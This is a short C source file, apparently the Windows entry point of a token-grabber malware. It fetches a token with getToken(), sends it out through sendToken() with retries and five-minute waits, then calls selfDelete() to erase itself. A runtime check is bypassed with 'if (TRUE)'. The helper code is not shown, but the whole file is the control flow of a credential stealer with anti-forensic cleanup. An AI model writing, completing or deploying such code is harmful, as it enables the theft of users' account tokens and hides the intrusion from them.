#include <windows.h>
#include "RunTimeCheck.h"
#include "Grabber.h"

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {

	if (TRUE) { 
		LPWSTR token = getToken();
		BOOL success = FALSE;
		int retries = 0;
		do {
			success = sendToken(token);
			retries++;
			if (!success) {
				Sleep(300000);
			}
		} while (!success && retries < 3);
	}
	selfDelete();
}